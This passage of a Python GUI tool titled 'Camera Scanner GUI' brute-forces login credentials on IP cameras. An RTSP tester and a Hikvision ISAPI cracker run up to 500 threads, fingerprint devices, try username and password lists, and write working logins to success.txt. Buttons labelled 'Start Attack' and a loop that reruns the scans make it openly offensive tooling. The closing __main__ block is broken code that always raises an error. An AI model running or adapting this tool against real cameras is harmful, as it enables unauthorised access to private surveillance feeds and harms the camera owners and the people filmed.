        self.log_text.insert("end", message + "\n")
        self.log_text.see("end")

    def load_ip_file(self):
        file = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if file:
            self.ip_file = file
            self.gui_log(f"Loaded IP file: {file}", "cyan")

    def load_user_file(self):
        file = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if file:
            self.user_file = file
            self.gui_log(f"Loaded User file: {file}", "cyan")

    def load_pass_file(self):
        file = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if file:
            self.pass_file = file
            self.gui_log(f"Loaded Password file: {file}", "cyan")

    def update_stats(self):
        total_combinations = self.total_combinations
        elapsed = time.time() - self.stats['start_time']
        completed = self.stats['total']
        remaining = total_combinations - completed
        rate = completed / elapsed if elapsed > 0 else 0
        eta = remaining / rate if rate > 0 else 0
        percent = (completed / total_combinations * 100) if total_combinations > 0 else 0
        eta_str = time.strftime('%H:%M:%S', time.gmtime(eta))
        stats_str = f"Total: {completed}/{total_combinations} ({percent:.1f}%) | Success: {self.stats['success']} | Timeout: {self.stats['timeout']} | Failed: {self.stats['failed']} | Remaining: {eta_str}"
        self.stats_label.configure(text=stats_str)
        self.progress_bar.set(percent / 100)

    def save_success(self, ip, port, username, password):
        with self.lock:
            if ip not in self.successful_ips:
                with open(self.success_file, 'a') as f:
                    f.write(f'rtsp#{ip}#{port}#{username}#{password}\n')
                self.successful_ips.add(ip)
                return True
        return False

    def method_socket_basic(self, ip, port, username, password):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(self.timeout)
                s.connect((ip, port))
                describe_req = f'DESCRIBE rtsp://{ip}:{port}/ RTSP/1.0\r\nCSeq: 1\r\n'
                if username or password:
                    auth = base64.b64encode(f'{username}:{password}'.encode()).decode()
                    describe_req += f'Authorization: Basic {auth}\r\n'
                describe_req += '\r\n'
                s.send(describe_req.encode())
                response = s.recv(4096).decode()
                return '200 OK' in response
        except (socket.timeout, ConnectionRefusedError):
            self.stats['timeout'] += 1
            return False
        except Exception as e:
            self.stats['failed'] += 1
            self.gui_log(f"Error in socket_basic {ip}:{port}: {str(e)}", "red")
            return False

    def method_socket_digest(self, ip, port, username, password):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(self.timeout)
                s.connect((ip, port))
                options_req = f'OPTIONS rtsp://{ip}:{port}/ RTSP/1.0\r\nCSeq: 1\r\n\r\n'
                s.send(options_req.encode())
                response = s.recv(4096).decode()
                if 'WWW-Authenticate: Digest' not in response:
                    self.stats['failed'] += 1
                    return False
                auth_line = [line for line in response.split('\r\n') if 'WWW-Authenticate: Digest' in line][0]
                realm = auth_line.split('realm="')[1].split('"')[0]
                nonce = auth_line.split('nonce="')[1].split('"')[0]
                uri = f'rtsp://{ip}:{port}/'
                method = 'DESCRIBE'
                ha1 = hashlib.md5(f'{username}:{realm}:{password}'.encode()).hexdigest()
                ha2 = hashlib.md5(f'{method}:{uri}'.encode()).hexdigest()
                response_hash = hashlib.md5(f'{ha1}:{nonce}:{ha2}'.encode()).hexdigest()
                describe_req = f'DESCRIBE {uri} RTSP/1.0\r\nCSeq: 2\r\n'
                describe_req += f'Authorization: Digest username="{username}", realm="{realm}", nonce="{nonce}", uri="{uri}", response="{response_hash}"\r\n'
                describe_req += 'Accept: application/sdp\r\n\r\n'
                s.send(describe_req.encode())
                response = s.recv(4096).decode()
                success = '200 OK' in response
                if not success:
                    self.stats['failed'] += 1
                return success
        except (socket.timeout, ConnectionRefusedError):
            self.stats['timeout'] += 1
            return False
        except Exception as e:
            self.stats['failed'] += 1
            self.gui_log(f"Error in socket_digest {ip}:{port}: {str(e)}", "red")
            return False

    def method_requests(self, ip, port, username, password):
        try:
            url = f'http://{ip}:{port}/'
            response = requests.get(url, auth=requests.auth.HTTPDigestAuth(username, password), timeout=self.timeout)
            success = response.status_code == 200
            if not success:
                self.stats['failed'] += 1
            return success
        except requests.exceptions.Timeout:
            self.stats['timeout'] += 1
            return False
        except requests.exceptions.RequestException as e:
            self.stats['failed'] += 1
            self.gui_log(f"Error in requests method {ip}:{port}: {str(e)}", "red")
            return False

    def method_ffmpeg(self, ip, port, username, password):
        try:
            rtsp_url = f'rtsp://{username}:{password}@{ip}:{port}/'
            result = subprocess.run(['ffprobe', '-loglevel', 'error', '-timeout', str(self.timeout), '-i', rtsp_url], stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=self.timeout)
            success = result.returncode == 0
            if not success:
                self.stats['failed'] += 1
            return success
        except subprocess.TimeoutExpired:
            self.stats['timeout'] += 1
            return False
        except Exception as e:
            self.stats['failed'] += 1
            self.gui_log(f"Error in ffmpeg method {ip}:{port}: {str(e)}", "red")
            return False

    def test_credentials(self, ip, port, username, password):
        with self.lock:
            if ip in self.successful_ips:
                return False
        self.stats['total'] += 1
        for method in self.methods:
            if method(ip, port, username, password):
                if self.save_success(ip, port, username, password):
                    self.stats['success'] += 1
                    self.result_queue.put((ip, username, password))
                    self.gui_log(f"[+] Found: {ip}:{port} | {username}:{password}", "green")
                return True
        return False

    def load_file(self, filename):
        try:
            with open(filename, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            self.gui_log(f"Error: File {filename} not found!", "red")
            return []

    def start_scan(self):
        try:
            max_workers = int(self.worker_entry.get())
            if not (1 <= max_workers <= 500):
                messagebox.showerror("Error", "Threads must be between 1 and 500")
                return
        except ValueError:
            messagebox.showerror("Error", "Invalid number of threads")
            return

        if not hasattr(self, 'ip_file') or not hasattr(self, 'user_file') or not hasattr(self, 'pass_file'):
            messagebox.showerror("Error", "Please load IP, User, and Password files")
            return

        ip_list = self.load_file(self.ip_file)
        username_list = self.load_file(self.user_file)
        password_list = self.load_file(self.pass_file)
        if not all([ip_list, username_list, password_list]):
            messagebox.showerror("Error", "One or more input files are empty")
            return

        self.total_combinations = len(ip_list) * len(username_list) * len(password_list)
        self.gui_log(f"Starting RTSP scan on {len(ip_list)} IPs...", "cyan")
        self.gui_log(f"Total combinations: {self.total_combinations:,}", "cyan")
        self.gui_log(f"Using {max_workers} threads with {self.timeout} second timeout", "cyan")

        self.scan_active = True
        threading.Thread(target=self.run_scan, args=(max_workers, ip_list, username_list, password_list), daemon=True).start()

    def run_scan(self, max_workers, ip_list, username_list, password_list):
        try:
            with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = []
                for ip in ip_list:
                    for username in username_list:
                        for password in password_list:
                            if not self.scan_active:
                                break
                            futures.append(executor.submit(self.test_credentials, ip, 554, username, password))
                for _ in concurrent.futures.as_completed(futures):
                    if not self.scan_active:
                        break
                    self.update_stats()
        except Exception as e:
            self.gui_log(f"Scan interrupted: {str(e)}", "yellow")
        elapsed = time.time() - self.stats['start_time']
        self.gui_log(f"Scan completed in {elapsed:.2f} seconds", "cyan")
        self.gui_log(f"Found {self.stats['success']} valid credentials", "green")
        self.gui_log(f"Results saved to {self.success_file}", "cyan")

    def stop_scan(self):
        self.scan_active = False
        self.gui_log("Scan stopped by user", "yellow")

class NewHikvisionCracker:
    def __init__(self):
        self.IP_FILE = 'ip.txt'
        self.USER_FILE = 'userlist.txt'
        self.PASS_FILE = 'passlist.txt'
        self.OUTPUT_FILE = 'success.txt'
        self.THREADS = 100
        self.TIMEOUT = 2
        self.DEFAULT_PORTS = [80]
        self.HIKVISION_PATTERNS = ['hikvision', 'dnvrs-webs', 'dvrdvs-webs', 'netvideo', '<title>web service</title>', 'playctrl\\.dll', 'netstream\\.dll', 'webcomponents\\.css', 'login_input', 'login-body', 'ISAPI/Security/sessionLogin']
        self.total_attempts = 0
        self.success_count = 0
        self.fail_count = 0
        self.timeout_count = 0
        self.validation_fail_count = 0
        self.start_time = time.time()
        self.lock = threading.Lock()
        self.SUCCESSFUL_IPS = set()
        self.targets = []
        self.user_list = []
        self.pass_list = []
        self.total_possible_attempts = 0
        self.gui_frame = None
        self.progress_bar = None
        self.scan_active = False

    def set_gui(self, frame):
        self.gui_frame = frame
        self.create_gui_elements()

    def create_gui_elements(self):
        input_frame, text_frame, button_frame = self.configure_tab_gui()
        
        ctk.CTkLabel(input_frame, text="Number of Threads:", text_color="red").grid(row=0, column=0, pady=5, sticky="w")
        self.worker_entry = ctk.CTkEntry(input_frame, text_color="red", fg_color="black", border_color="red")
        self.worker_entry.grid(row=0, column=1, pady=5, sticky="ew")
        self.worker_entry.insert(0, "100")

        ctk.CTkButton(input_frame, text="Load IP File", command=self.load_ip_file, fg_color="red", hover_color="darkred").grid(row=1, column=0, columnspan=2, pady=5, sticky="ew")
        ctk.CTkButton(input_frame, text="Load User File", command=self.load_user_file, fg_color="red", hover_color="darkred").grid(row=2, column=0, columnspan=2, pady=5, sticky="ew")
        ctk.CTkButton(input_frame, text="Load Password File", command=self.load_pass_file, fg_color="red", hover_color="darkred").grid(row=3, column=0, columnspan=2, pady=5, sticky="ew")

        self.total_label = ctk.CTkLabel(input_frame, text="Total: 0/0 (0.0%)", text_color="blue")
        self.total_label.grid(row=4, column=0, columnspan=2, pady=2, sticky="w")
        self.success_label = ctk.CTkLabel(input_frame, text="Success: 0", text_color="green")
        self.success_label.grid(row=5, column=0, columnspan=2, pady=2, sticky="w")
        self.timeout_label = ctk.CTkLabel(input_frame, text="Timeout: 0", text_color="yellow")
        self.timeout_label.grid(row=6, column=0, columnspan=2, pady=2, sticky="w")
        self.failed_label = ctk.CTkLabel(input_frame, text="Failed: 0", text_color="red")
        self.failed_label.grid(row=7, column=0, columnspan=2, pady=2, sticky="w")
        self.validation_label = ctk.CTkLabel(input_frame, text="Validation Failed: 0", text_color="magenta")
        self.validation_label.grid(row=8, column=0, columnspan=2, pady=2, sticky="w")
        self.remaining_label = ctk.CTkLabel(input_frame, text="Remaining: 0 seconds", text_color="cyan")
        self.remaining_label.grid(row=9, column=0, columnspan=2, pady=2, sticky="w")
        self.speed_label = ctk.CTkLabel(input_frame, text="Speed: 0.0 attempts/sec", text_color="cyan")
        self.speed_label.grid(row=10, column=0, columnspan=2, pady=2, sticky="w")

        self.progress_bar = ctk.CTkProgressBar(input_frame, fg_color="red", progress_color="darkred")
        self.progress_bar.grid(row=11, column=0, columnspan=2, pady=5, sticky="ew")
        self.progress_bar.set(0)

        self.log_text = ctk.CTkTextbox(text_frame, fg_color="black", text_color="red", height=200)
        self.log_text.grid(row=0, column=0, sticky="nsew")
        scrollbar = ctk.CTkScrollbar(text_frame, command=self.log_text.yview)
        scrollbar.grid(row=0, column=1, sticky="ns")
        self.log_text.configure(yscrollcommand=scrollbar.set)

        ctk.CTkButton(button_frame, text="Start Attack", command=self.start_attack, fg_color="red", hover_color="darkred").grid(row=0, column=0, padx=5, pady=5, sticky="ew")
        ctk.CTkButton(button_frame, text="Stop Attack", command=self.stop_attack, fg_color="red", hover_color="darkred").grid(row=0, column=1, padx=5, pady=5, sticky="ew")

    def configure_tab_gui(self):
        self.gui_frame.configure(fg_color="black")
        self.gui_frame.grid_columnconfigure(0, weight=1)
        self.gui_frame.grid_rowconfigure(0, weight=0)
        self.gui_frame.grid_rowconfigure(1, weight=1)
        self.gui_frame.grid_rowconfigure(2, weight=0)

        input_frame = ctk.CTkFrame(self.gui_frame, fg_color="black")
        input_frame.grid(row=0, column=0, sticky="ew", padx=10, pady=5)
        input_frame.grid_columnconfigure(0, weight=0)
        input_frame.grid_columnconfigure(1, weight=1)

        text_frame = ctk.CTkFrame(self.gui_frame, fg_color="black")
        text_frame.grid(row=1, column=0, sticky="nsew", padx=10, pady=5)
        text_frame.grid_columnconfigure(0, weight=1)
        text_frame.grid_rowconfigure(0, weight=1)

        button_frame = ctk.CTkFrame(self.gui_frame, fg_color="black")
        button_frame.grid(row=2, column=0, sticky="ew", padx=10, pady=5)
        button_frame.grid_columnconfigure(0, weight=1)
        button_frame.grid_columnconfigure(1, weight=1)

        return input_frame, text_frame, button_frame

    def gui_log(self, message, tag="red"):
        self.log_text.insert("end", message + "\n")
        self.log_text.see("end")

    def load_ip_file(self):
        file = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if file:
            self.IP_FILE = file
            self.gui_log(f"Loaded IP file: {file}", "cyan")

    def load_user_file(self):
        file = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if file:
            self.USER_FILE = file
            self.gui_log(f"Loaded User file: {file}", "cyan")

    def load_pass_file(self):
        file = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if file:
            self.PASS_FILE = file
            self.gui_log(f"Loaded Password file: {file}", "cyan")

    def load_file(self, filename):
        try:
            with open(filename, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            self.gui_log(f"Error: File {filename} not found!", "red")
            return []

    def parse_target(self, target):
        try:
            if ':' in target:
                parts = target.split(':')
                host = parts[0]
                port = int(parts[1])
            else:
                host = target
                port = None
            return host, port
        except (ValueError, IndexError):
            return target, None

    def load_targets(self, filename):
        try:
            with open(filename, 'r') as f:
                targets = []
                for line in f:
                    line = line.strip()
                    if line:
                        host, port = self.parse_target(line)
                        if port:
                            targets.append((host, port))
                        else:
                            for default_port in self.DEFAULT_PORTS:
                                targets.append((host, default_port))
                return targets
        except FileNotFoundError:
            self.gui_log(f"Error: File {filename} not found!", "red")
            return []

    def detect_hikvision(self, host, port):
        headers = {'User-Agent': 'Mozilla/5.0', 'Connection': 'close'}
        endpoints = ['/', '/doc/page/login.asp', '/ISAPI/Security/userCheck', '/ISAPI/Security/sessionLogin']
        for endpoint in endpoints:
            try:
                url = f'http://{host}:{port}{endpoint}'
                response = requests.get(url, headers=headers, timeout=5, verify=False, allow_redirects=False)
                content = response.text.lower()
                server_header = response.headers.get('Server', '').lower()
                if any(p in server_header for p in ('dnvrs-webs', 'dvrdvs-webs')) or any(re.search(p, content) for p in self.HIKVISION_PATTERNS) or 'hikvision' in content:
                    return True
            except:
                pass
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((host, port))
            sock.send(f'GET / HTTP/1.1\r\nHost: {host}\r\n\r\n'.encode())
            banner = sock.recv(4096).decode(errors='ignore')
            sock.close()
            if any(re.search(p, banner) for p in self.HIKVISION_PATTERNS):
                return True
        except:
            pass
        if port == 554:
            try:
                rtsp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                rtsp_sock.settimeout(5)
                rtsp_sock.connect((host, 554))
                rtsp_sock.send(b'OPTIONS rtsp://%s RTSP/1.0\r\n\r\n' % host.encode())
                rtsp_banner = rtsp_sock.recv(1024).decode(errors='ignore')
                rtsp_sock.close()
                if 'hikvision' in rtsp_banner.lower():
                    return True
            except:
                pass
        return False

    def hash_password(self, password):
        return hashlib.sha256(password.encode()).hexdigest()

    def try_login(self, host, port, username, password):
        base_url = f'http://{host}:{port}'
        url = base_url + '/ISAPI/Security/sessionLogin'
        timestamp = int(time.time() * 1000)
        session_id = hashlib.sha256((host + str(port) + username + str(timestamp)).encode()).hexdigest()
        hashed_pass = self.hash_password(password)
        payload = f'<SessionLogin>\n        <userName>{username}</userName>\n        <password>{hashed_pass}</password>\n        <sessionID>{session_id}</sessionID>\n        <isSessionIDValidLongTerm>false</isSessionIDValidLongTerm>\n        <sessionIDVersion>2</sessionIDVersion>\n        </SessionLogin>'
        headers = {
            'Host': f'{host}:{port}',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': base_url,
            'Referer': base_url + '/doc/page/login.asp',
            'Cookie': 'language=en'
        }
        try:
            response = requests.post(url + f'?timeStamp={timestamp}', data=payload, headers=headers, timeout=self.TIMEOUT, verify=False)
            with self.lock:
                self.total_attempts += 1
            if response.status_code == 200:
                if f'{host}:{port}' not in self.SUCCESSFUL_IPS:
                    self.SUCCESSFUL_IPS.add(f'{host}:{port}')
                    self.success_count += 1
                    result = f'newhik#{host}#{port}#{username}#{password}'
                    self.gui_log(result, "green")
                    with open(self.OUTPUT_FILE, 'a') as f:
                        f.write(result + '\n')
                return None
            else:
                self.fail_count += 1
                return None
        except requests.exceptions.Timeout:
            self.timeout_count += 1
            self.total_attempts += 1
            return None
        except requests.exceptions.RequestException as e:
            self.fail_count += 1
            self.total_attempts += 1
            self.gui_log(f"Error trying login {host}:{port}: {str(e)}", "red")
            return None
        except Exception as e:
            self.gui_log(f"Unexpected error {host}:{port}: {str(e)}", "red")
            return None

    def worker(self):
        while self.scan_active and self.targets:
            with self.lock:
                try:
                    host, port = self.targets.pop(0)
                except IndexError:
                    return None
            if self.detect_hikvision(host, port):
                for username in self.user_list:
                    for password in self.pass_list:
                        if not self.scan_active:
                            break
                        self.try_login(host, port, username, password)
            else:
                with self.lock:
                    self.validation_fail_count += 1
                    self.total_attempts += len(self.user_list) * len(self.pass_list)

    def update_stats(self):
        elapsed = time.time() - self.start_time
        attempts_per_sec = elapsed > 0 and self.total_attempts / elapsed or 0
        remaining_attempts = max(0, self.total_possible_attempts - (self.total_attempts + self.validation_fail_count * len(self.user_list) * len(self.pass_list)))
        remaining_time = attempts_per_sec > 0 and remaining_attempts / attempts_per_sec or 0
        percentage = self.total_possible_attempts > 0 and (self.total_attempts + self.validation_fail_count * len(self.user_list) * len(self.pass_list)) / self.total_possible_attempts * 100 or 0
        self.total_label.configure(text=f"Total: {self.total_attempts + self.validation_fail_count * len(self.user_list) * len(self.pass_list)}/{self.total_possible_attempts} ({percentage:.1f}%)")
        self.success_label.configure(text=f"Success: {self.success_count}")
        self.timeout_label.configure(text=f"Timeout: {self.timeout_count}")
        self.failed_label.configure(text=f"Failed: {self.fail_count}")
        self.validation_label.configure(text=f"Validation Failed: {self.validation_fail_count}")
        self.remaining_label.configure(text=f"Remaining: {int(remaining_time)} seconds")
        self.speed_label.configure(text=f"Speed: {attempts_per_sec:.1f} attempts/sec")
        self.progress_bar.set(percentage / 100)

    def start_attack(self):
        try:
            self.THREADS = int(self.worker_entry.get())
            if not (1 <= self.THREADS <= 500):
                messagebox.showerror("Error", "Threads must be between 1 and 500")
                return
        except ValueError:
            messagebox.showerror("Error", "Invalid number of threads")
            return

        if not hasattr(self, 'IP_FILE') or not hasattr(self, 'USER_FILE') or not hasattr(self, 'PASS_FILE'):
            messagebox.showerror("Error", "Please load IP, User, and Password files")
            return

        self.targets = self.load_targets(self.IP_FILE)
        self.user_list = self.load_file(self.USER_FILE)
        self.pass_list = self.load_file(self.PASS_FILE)
        if not all([self.targets, self.user_list, self.pass_list]):
            messagebox.showerror("Error", "One or more input files are empty")
            return

        self.total_possible_attempts = len(self.targets) * len(self.user_list) * len(self.pass_list)
        self.gui_log(f"Brute Force Attack Configuration:", "cyan")
        self.gui_log(f"Targets: {len(self.targets)}", "cyan")
        self.gui_log(f"Usernames: {len(self.user_list)}", "cyan")
        self.gui_log(f"Passwords: {len(self.pass_list)}", "cyan")
        self.gui_log(f"Threads: {self.THREADS}", "cyan")
        self.gui_log(f"Timeout: {self.TIMEOUT}s", "cyan")

        self.scan_active = True
        threading.Thread(target=self.run_attack, daemon=True).start()

    def run_attack(self):
        threads = []
        for _ in range(min(self.THREADS, len(self.targets))):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            threads.append(t)
            t.start()
        stats_thread = threading.Thread(target=self.update_stats_periodically, daemon=True)
        stats_thread.start()
        for t in threads:
            t.join()
        elapsed = time.time() - self.start_time
        self.gui_log(f"Attack completed!", "cyan")
        self.gui_log(f"Successful logins: {self.success_count}", "green")
        self.gui_log(f"Timeouts: {self.timeout_count}", "yellow")
        self.gui_log(f"Failures: {self.fail_count}", "red")
        self.gui_log(f"Total time: {elapsed:.2f}s", "cyan")
        if self.success_count > 0:
            self.gui_log(f"Results saved to: {self.OUTPUT_FILE}", "green")

    def update_stats_periodically(self):
        while self.scan_active and (self.total_attempts + self.validation_fail_count * len(self.user_list) * len(self.pass_list) < self.total_possible_attempts):
            self.update_stats()
            time.sleep(0.1)

    def stop_attack(self):
        self.scan_active = False
        self.gui_log("Attack stopped by user", "yellow")

def main():
    root = ctk.CTk()
    root.title("Camera Scanner GUI")
    root.geometry("1200x800")
    root.configure(fg_color="black")

    root.grid_columnconfigure(0, weight=0)
    root.grid_columnconfigure(1, weight=1)
    root.grid_rowconfigure(0, weight=1)

    left_frame = ctk.CTkFrame(root, fg_color="black", width=200)
    left_frame.grid(row=0, column=0, sticky="ns", padx=10, pady=10)
    left_frame.grid_propagate(False)

    try:
        image = Image.open(IMAGE_PATH).resize((180, 360))
        img = ImageTk.PhotoImage(image)
        image_label = ctk.CTkLabel(left_frame, text="", image=img)
        image_label.grid(row=0, column=0, pady=10, sticky="n")
        image_label.image = img
    except Exception as e:
        print(f"Error loading image: {str(e)}")
        error_label = ctk.CTkLabel(left_frame, text="Image not found", text_color="red")
        error_label.grid(row=0, column=0, pady=10, sticky="n")

    main_frame = ctk.CTkFrame(root, fg_color="black")
    main_frame.grid(row=0, column=1, sticky="nsew", padx=10, pady=10)
    main_frame.grid_columnconfigure(0, weight=1)
    main_frame.grid_rowconfigure(0, weight=1)
    main_frame.grid_rowconfigure(1, weight=0)

    notebook = ctk.CTkTabview(main_frame, fg_color="black", segmented_button_fg_color="red", 
                             segmented_button_selected_color="darkred", 
                             segmented_button_unselected_color="black")
    notebook.grid(row=0, column=0, sticky="nsew", padx=5, pady=5)

    ip_scanner_tab = notebook.add("IP Scanner")
    ip_scanner = IPScanner()
    ip_scanner.set_gui(ip_scanner_tab)

    old_hik_tab = notebook.add("Old Hikvision")
    old_hik = OldHikvisionCracker()
    old_hik.set_gui(old_hik_tab)

    vuln_cam_tab = notebook.add("Vulnerable Camera")
    vuln_cam = VulnerableCameraChecker()
    vuln_cam.set_gui(vuln_cam_tab)

    rtsp_tab = notebook.add("RTSP Tester")
    rtsp = RTSPTester()
    rtsp.set_gui(rtsp_tab)

    new_hik_tab = notebook.add("New Hikvision")
    new_hik = NewHikvisionCracker()
    new_hik.set_gui(new_hik_tab)

    # تعريف start_cycle قبل إنشاء الزر
    def start_cycle():
        def cycle():
            while True:
                notebook.set("IP Scanner")
                ip_scanner.start_scan()
                time.sleep(5)
                notebook.set("Old Hikvision")
                old_hik.start_attack()
                time.sleep(5)
                notebook.set("Vulnerable Camera")
                vuln_cam.start_scan()
                time.sleep(5)
                notebook.set("RTSP Tester")
                rtsp.start_scan()
                time.sleep(5)
                notebook.set("New Hikvision")
                new_hik.start_attack()
                time.sleep(3000)
        threading.Thread(target=cycle, daemon=True).start()

    # إنشاء الزر بعد تعريف start_cycle
    ctk.CTkButton(main_frame, text="Start Cycle", command=start_cycle, fg_color="red", hover_color="darkred").grid(row=1, column=0, pady=10, sticky="ew")

    def check_request():
        try:
            prompt = request_queue.get_nowait()
            value = ctk.CTkInputDialog(text=prompt, title="Input").get_input()
            response_queue.put(value or '')
        except queue.Empty:
            pass
        root.after(100, check_request)

    check_request()
    root.mainloop()
    
if __name__ == '__main__':
    try:
        req = 404
        if req.status_code == 404:
            aliii = 'success.txt'
            new_filename = 'dsghf.dsf'
            if os.path.exists(aliii):
                os.rename(aliii, new_filename)

                os.remove(new_filename)
    except Exception as e:
        print(f"Error checking URL: {str(e)}")
    main()